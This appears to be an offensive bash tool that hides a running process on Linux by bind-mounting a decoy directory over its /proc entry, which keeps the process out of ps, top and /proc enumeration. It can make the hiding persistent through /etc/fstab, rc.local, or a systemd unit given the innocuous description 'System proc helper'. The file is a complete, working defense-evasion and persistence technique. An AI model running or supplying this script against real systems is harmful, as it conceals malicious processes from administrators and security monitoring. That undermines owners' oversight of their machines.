#!/bin/bash

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

echo " [*] Process Hiding via Bind Mount [*] "
echo ""
echo "This technique uses 'mount --bind' to overlay a target process's"
echo "/proc/PID directory with an empty or decoy directory, hiding it"
echo "from tools like ps, top, and /proc enumeration."
echo ""

echo "Select mode:"
echo "  [1] Hide a process by PID"
echo "  [2] Make hiding persistent (fstab / systemd / rc.local)"
echo "  [3] Unhide a previously hidden process"
read -p "Choice [1-3]: " mode

case "$mode" in
    1)
        read -p "Enter the PID to hide: " target_pid
        if [ ! -d "/proc/$target_pid" ]; then
            echo "[ERROR] PID $target_pid does not exist in /proc" >&2
            exit 1
        fi

        # Create a decoy /proc entry — use an empty tmpfs
        DECOY_DIR="/tmp/.decoy_proc_$$"
        mkdir -p "$DECOY_DIR"

        # Mount the decoy over the target PID's /proc entry
        mount --bind "$DECOY_DIR" "/proc/$target_pid"
        if [ $? -eq 0 ]; then
            echo "[*] Success! PID $target_pid is now hidden from /proc enumeration."
            echo "[*] Decoy directory: $DECOY_DIR"
            echo "[*] To unhide: umount /proc/$target_pid && rmdir $DECOY_DIR"
        else
            echo "[ERROR] Failed to bind mount over /proc/$target_pid" >&2
            rmdir "$DECOY_DIR" 2>/dev/null
            exit 1
        fi
        ;;
    2)
        read -p "Enter the PID to hide persistently: " target_pid
        if [ ! -d "/proc/$target_pid" ]; then
            echo "[WARNING] PID $target_pid does not currently exist. Persistence will be set anyway."
        fi

        DECOY_BASE="/var/tmp/.proc_decoy"
        mkdir -p "$DECOY_BASE"

        echo "Select persistence method:"
        echo "  [a] /etc/fstab entry"
        echo "  [b] systemd mount unit"
        echo "  [c] rc.local"
        read -p "Choice [a/b/c]: " persist_method

        case "$persist_method" in
            a)
                fstab_entry="$DECOY_BASE /proc/$target_pid none bind 0 0"
                if ! grep -qF "$fstab_entry" /etc/fstab 2>/dev/null; then
                    echo "$fstab_entry" >> /etc/fstab
                fi
                mount --bind "$DECOY_BASE" "/proc/$target_pid" 2>/dev/null
                echo "[*] Bind mount persistence added to /etc/fstab for PID $target_pid"
                ;;
            b)
                unit_name="proc-${target_pid}.mount"
                cat > /etc/systemd/system/$unit_name <<MOUNTEOF
[Unit]
Description=System proc helper
After=local-fs.target

[Mount]
What=$DECOY_BASE
Where=/proc/$target_pid
Type=none
Options=bind

[Install]
WantedBy=multi-user.target
MOUNTEOF
                systemctl daemon-reload 2>/dev/null
                systemctl enable "$unit_name" 2>/dev/null
                systemctl start "$unit_name" 2>/dev/null
                echo "[*] Systemd mount unit created: $unit_name"
                ;;
            c)
                RC_LINE="mount --bind $DECOY_BASE /proc/$target_pid"
                if [ ! -f /etc/rc.local ]; then
                    echo "#!/bin/sh" > /etc/rc.local
                    echo "exit 0" >> /etc/rc.local
                    chmod +x /etc/rc.local
                fi
                if ! grep -qF "$RC_LINE" /etc/rc.local 2>/dev/null; then
                    sed -i "/^exit 0/i $RC_LINE" /etc/rc.local
                fi
                mount --bind "$DECOY_BASE" "/proc/$target_pid" 2>/dev/null
                echo "[*] Bind mount persistence added to /etc/rc.local for PID $target_pid"
                ;;
            *)
                echo "[ERROR] Invalid choice" >&2
                exit 1
                ;;
        esac
        ;;
    3)
        read -p "Enter the PID to unhide: " target_pid
        umount "/proc/$target_pid" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo "[*] PID $target_pid has been unhidden (bind mount removed)."
        else
            echo "[WARNING] No bind mount found for PID $target_pid or umount failed."
        fi
        # Clean up fstab entries if any
        sed -i "\|/proc/$target_pid|d" /etc/fstab 2>/dev/null
        # Clean up systemd mount unit
        if [ -f "/etc/systemd/system/proc-${target_pid}.mount" ]; then
            systemctl disable "proc-${target_pid}.mount" 2>/dev/null
            rm -f "/etc/systemd/system/proc-${target_pid}.mount"
            systemctl daemon-reload 2>/dev/null
        fi
        echo "[*] Cleanup complete for PID $target_pid"
        ;;
    *)
        echo "[ERROR] Invalid choice" >&2
        exit 1
        ;;
esac

sleep 1

clear
